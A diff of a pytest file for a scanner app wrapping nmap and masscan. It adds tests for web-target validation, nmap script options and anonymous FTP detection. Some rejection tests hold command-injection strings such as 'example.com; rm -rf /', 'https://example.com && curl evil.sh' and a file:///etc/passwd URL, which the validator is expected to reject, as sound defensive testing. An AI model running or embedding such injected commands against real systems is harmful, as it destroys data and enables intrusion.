@@ -5,7 +5,11 @@ import pytest
 
 from app.scanner.masscan_wrapper import run_masscan
 from app.scanner.nmap_wrapper import _scan_port_spec, run_nmap
-from app.scanner.validator import validate_domain, validate_target
+from app.scanner.validator import (
+    validate_domain,
+    validate_target,
+    validate_web_target,
+)
 
 
 @pytest.mark.parametrize(
@@ -111,6 +115,39 @@ def test_validate_domain_rejects_injection_characters() -> None:
     for char in (";", "|", "&", "$", "`", " "):
         with pytest.raises(ValueError, match="forbidden"):
             validate_domain(f"example{char}com")
+
+
+def test_validate_web_target_accepts_urls_hosts_and_ips() -> None:
+    assert validate_web_target("https://example.com") == "https://example.com"
+    assert validate_web_target("http://example.com") == "http://example.com"
+    assert validate_web_target("http://1.2.3.4:8080") == "http://1.2.3.4:8080"
+    assert (
+        validate_web_target("https://sub.example.com:8443")
+        == "https://sub.example.com:8443"
+    )
+    assert validate_web_target("example.com") == "example.com"
+    assert validate_web_target("1.2.3.4") == "1.2.3.4"
+    assert validate_web_target("HTTPS://Example.COM") == "https://example.com"
+
+
+@pytest.mark.parametrize(
+    "target",
+    [
+        "",
+        "   ",
+        "not a url with space",
+        "file:///etc/passwd",
+        "ftp://example.com",
+        "example.com; rm -rf /",
+        "https://example.com && curl evil.sh",
+        "https://:8080",
+        "http://example.com:99999",
+        "httpx -list /etc/hosts",
+    ],
+)
+def test_validate_web_target_rejects_unsafe_values(target: str) -> None:
+    with pytest.raises(ValueError):
+        validate_web_target(target)
 
 
 def test_nmap_port_spec_keeps_masscan_ports_and_adds_os_discovery_range() -> None:
@@ -362,7 +399,7 @@ def test_nmap_wrapper_parses_deep_scan_metadata() -> None:
 
     assert result.os_detection == "Linux 5.4 (95%)"
     assert result.scripts_output == {
-        "80/tcp:http-title": "Title: Example",
+        "http-title": "Title: Example",
         "ssl-cert": "Issuer: Example CA",
     }
     assert result.traceroute[0].ip == "192.0.2.254"
@@ -410,3 +447,168 @@ def test_nmap_wrapper_rejects_broken_xml_response() -> None:
 def test_nmap_wrapper_rejects_unsafe_ports_before_import() -> None:
     with pytest.raises(ValueError):
         run_nmap("127.0.0.1", ports="80; --script evil")
+
+
+def _nmap_process_modules(
+    parser_hosts: object,
+) -> tuple[ModuleType, ModuleType, ModuleType, dict[str, object]]:
+    process = SimpleNamespace(stdout="nmap output", run=MagicMock())
+    captured: dict[str, object] = {}
+    nmap_process_module = ModuleType("libnmap.process")
+    nmap_process_module.NmapProcess = (
+        lambda **kwargs: captured.update(kwargs) or process  # type: ignore[attr-defined]
+    )
+    nmap_parser_module = ModuleType("libnmap.parser")
+    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
+        parse=lambda output: SimpleNamespace(hosts=parser_hosts)
+    )
+    return nmap_process_module, nmap_parser_module, process, captured
+
+
+def test_nmap_wrapper_passes_script_categories_and_extended_timeouts() -> None:
+    service = SimpleNamespace(
+        port=21,
+        protocol="tcp",
+        service="ftp",
+        service_product="",
+        service_version="",
+        scripts_results=[],
+    )
+    host = SimpleNamespace(
+        services=[service], scripts_results=[], os=SimpleNamespace(osmatches=[])
+    )
+    process_module, parser_module, _, captured = _nmap_process_modules([host])
+
+    with patch(
+        "app.scanner.nmap_wrapper.importlib.import_module",
+        side_effect=[process_module, parser_module],
+    ):
+        result = run_nmap("192.168.1.1", ports="21")
+
+    options = str(captured["options"])
+    assert "--script=auth,discovery,broadcast" in options
+    assert "--host-timeout 30m" in options
+    assert "--script-timeout 5m" in options
+    assert result.has_anonymous_access is False
+
+
+def test_nmap_wrapper_accepts_custom_script_categories() -> None:
+    service = SimpleNamespace(
+        port=80,
+        protocol="tcp",
+        service="http",
+        service_product="",
+        service_version="",
+        scripts_results=[],
+    )
+    host = SimpleNamespace(
+        services=[service], scripts_results=[], os=SimpleNamespace(osmatches=[])
+    )
+    process_module, parser_module, _, captured = _nmap_process_modules([host])
+
+    with patch(
+        "app.scanner.nmap_wrapper.importlib.import_module",
+        side_effect=[process_module, parser_module],
+    ):
+        run_nmap("192.168.1.1", ports="80", script_categories=["discovery"])
+
+    assert "--script=discovery" in str(captured["options"])
+
+
+def test_nmap_wrapper_rejects_invalid_script_categories() -> None:
+    for categories in (
+        [],
+        [""],
+        ["vuln; rm -rf /"],
+        ["discovery", "--script evil"],
+        ["UPPER"],
+    ):
+        with pytest.raises(ValueError, match="script category"):
+            run_nmap("192.168.1.1", script_categories=categories)
+
+
+def test_nmap_wrapper_detects_anonymous_ftp_access() -> None:
+    process = SimpleNamespace(stdout="nmap output", run=MagicMock())
+    nmap_process_module = ModuleType("libnmap.process")
+    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
+    service = SimpleNamespace(
+        port=21,
+        protocol="tcp",
+        service="ftp",
+        service_product="",
+        service_version="",
+        scripts_results=[
+            {
+                "id": "ftp-anon",
+                "output": "Anonymous FTP login allowed (FTP code 230)",
+            }
+        ],
+    )
+    host = SimpleNamespace(
+        services=[service], scripts_results=[], os=SimpleNamespace(osmatches=[])
+    )
+    nmap_parser_module = ModuleType("libnmap.parser")
+    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
+        parse=lambda output: SimpleNamespace(hosts=[host])
+    )
+
+    with patch(
+        "app.scanner.nmap_wrapper.importlib.import_module",
+        side_effect=[nmap_process_module, nmap_parser_module],
+    ):
+        result = run_nmap("192.168.1.1", ports="21")
+
+    assert (
+        result.scripts_output["ftp-anon"]
+        == "Anonymous FTP login allowed (FTP code 230)"
+    )
+    assert result.has_anonymous_access is True
+
+
+def test_nmap_wrapper_does_not_treat_closed_ftp_as_anonymous() -> None:
+    process = SimpleNamespace(stdout="nmap output", run=MagicMock())
+    nmap_process_module = ModuleType("libnmap.process")
+    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
+    host = SimpleNamespace(
+        services=[],
+        scripts_results=[{"id": "ftp-anon", "output": "FTP 530 login denied"}],
+        os=SimpleNamespace(osmatches=[]),
+    )
+    nmap_parser_module = ModuleType("libnmap.parser")
+    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
+        parse=lambda output: SimpleNamespace(hosts=[host])
+    )
+
+    with patch(
+        "app.scanner.nmap_wrapper.importlib.import_module",
+        side_effect=[nmap_process_module, nmap_parser_module],
+    ):
+        result = run_nmap("192.168.1.1", ports="21")
+
+    assert result.has_anonymous_access is False
+
+
+def test_nmap_wrapper_extracts_scripts_from_xml_fallback() -> None:
+    xml_output = (
+        "<nmaprun><host><script id='broadcast-dhcp-discover' output='Got answer'/>"
+        "</host></nmaprun>"
+    )
+    process = SimpleNamespace(stdout=xml_output, run=MagicMock())
+    nmap_process_module = ModuleType("libnmap.process")
+    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
+    empty_host = SimpleNamespace(
+        services=[], scripts_results=[], os=SimpleNamespace(osmatches=[])
+    )
+    nmap_parser_module = ModuleType("libnmap.parser")
+    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
+        parse=lambda output: SimpleNamespace(hosts=[empty_host])
+    )
+
+    with patch(
+        "app.scanner.nmap_wrapper.importlib.import_module",
+        side_effect=[nmap_process_module, nmap_parser_module],
+    ):
+        result = run_nmap("192.168.1.1")
+
+    assert result.scripts_output["broadcast-dhcp-discover"] == "Got answer"
+    assert result.traceroute == []
